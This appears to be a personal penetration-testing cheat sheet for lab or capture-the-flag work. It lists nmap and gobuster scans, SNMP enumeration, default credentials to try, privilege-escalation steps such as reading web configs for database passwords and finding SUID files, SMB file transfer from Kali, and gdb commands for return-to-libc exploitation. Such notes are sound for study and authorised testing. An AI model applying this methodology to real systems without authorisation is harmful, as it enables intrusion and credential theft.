# Philosophy
- first, test the potential vuln (or each step of it) by minimum cost

# Init contact
- nmap -sC -sV -oA \<name\> \<ip\>
- nmap -p- -sV \<ip\> > all-tcp
- nmap -sU \<ip\> > comm-udp
- nmap --script vuln \<ip\>

# http/https 80/443
- gobuster -u http://xxxxx -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html
  - remember to recursively scan if needed
- google its software version and find its exploit
- login page => google its default cred
- play around and see whether there is any upload/execute vuln
- check its ssl cert information, it may contain some username or email
- play with PHPSESSID, reuse it, to see what happens

# snmp udp/161
- snmpwalk -c public -v1 <target>
- snmp-check -w -t 30 <target>

# priv esc
- go to /var/www/, read config => get db cred => extract juicy info
- password reuse
- find SUID files => find / -perm -4000 2>/dev/null
- find all files in /home => find /home -type f

# manually test user pass
- admin:admin
- admin:password
- admin:Password1
- guest:guest

# file 
- exitfool xx => find hidden info, like author, email

# File Transfer
- smb share
  - (kali) impacket-smbserver share \<shared path\>
  - (windows) net use z: \\\\<kali's ip\>\share
  - (windows) copy \<file\> z:

# gdb
r < <(python exp.py)
(or 'set args' if take parameters)

r < input.txt

readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit

strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh'

p system => address of function system

info functions => list all functions

vmmap 
=> find which part is executable.
